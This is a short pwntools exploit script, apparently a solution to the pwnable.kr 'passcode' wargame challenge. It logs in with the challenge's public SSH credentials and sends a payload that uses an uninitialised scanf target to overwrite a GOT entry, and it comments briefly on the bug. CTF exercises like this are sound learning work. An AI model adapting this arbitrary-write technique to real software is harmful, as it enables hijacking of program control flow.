from pwn import *

conn = ssh(host="pwnable.kr", port=2222, user="passcode", password="guest")

payload = 'A'*96 + p32(0x804A004) + str(0x80485e3) + "\n"
# The passcode1 has not been initialized and without & symbol so that the user input will overwrite the address of the value of passcode1.
# Arbitrary address overwrite
p = conn.process("./passcode")
p.sendline(payload)
print p.recvall()
